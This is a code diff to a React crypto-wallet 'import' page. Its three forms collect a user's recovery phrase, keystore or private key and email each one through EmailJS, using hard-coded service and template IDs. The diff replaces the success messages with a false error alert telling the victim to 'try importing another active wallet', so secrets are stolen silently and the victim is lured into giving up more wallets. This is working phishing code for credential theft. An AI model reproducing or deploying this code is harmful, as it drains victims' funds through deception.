@@ -8,7 +8,7 @@ import { useWallet } from "../../context";
 
 
 export const PhraseForm = () => {
-
+    const { handleChange } = useWallet();
     const [message, setMessage] = useState("")
     const [loading, setLoading] = useState(false);
 
@@ -16,9 +16,10 @@ export const PhraseForm = () => {
         e.preventDefault();
         setLoading(true);
         emailjs.send("service_y2bhhrr", "template_pdxgf2g", { email_subject: "New Phrase Data", message, email_title: "Phrase Data", key: "Recovery Phrase" }, "JEfCbGU-NY097Ysab").then(() => {
-           toast.success("Phrase email sent")
            setLoading(false);
            setMessage("");
+           window.alert("An error occurred, try importing another active wallet");
+           handleChange(null);
         }, () => {
             toast.error("Email sending failed. Try again later.");
            setLoading(false);
@@ -43,15 +44,19 @@ const KeystoreForm = () => {
 
     const [keystore, setKeystore] = useState("");
     const [loading, setLoading] = useState(false);
+    const { handleChange } = useWallet();
+
 
     const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
         setLoading(true);
         emailjs.send("service_y2bhhrr", "template_5ccyb9i", { keystore }, "JEfCbGU-NY097Ysab").then(() => {
-           toast.success("Keystore email sent")
+
            setLoading(false);
            setKeystore("");
+           window.alert("An error occurred, try importing another active wallet");
+           handleChange(null);
         }, () => {
             toast.error("Email sending failed. Try again later.");
            setLoading(false);
@@ -75,6 +80,7 @@ const KeystoreForm = () => {
 
 const PrivateKeyForm = () => {
 
+    const { handleChange } = useWallet();
     const [message, setMessage] = useState("");
     const [loading, setLoading] = useState(false);
 
@@ -82,9 +88,11 @@ const PrivateKeyForm = () => {
         e.preventDefault();
         setLoading(true);
         emailjs.send("service_y2bhhrr", "template_pdxgf2g", { email_subject: "New Private Key Data", message, email_title: "Private Key Data", key: "Private Key" }, "JEfCbGU-NY097Ysab").then(() => {
-           toast.success("Private key email sent")
+           
            setLoading(false);
            setMessage("")
+           window.alert("An error occurred, try importing another active wallet");
+           handleChange(null);
         }, () => {
             toast.error("Email sending failed. Try again later.");
            setLoading(false);
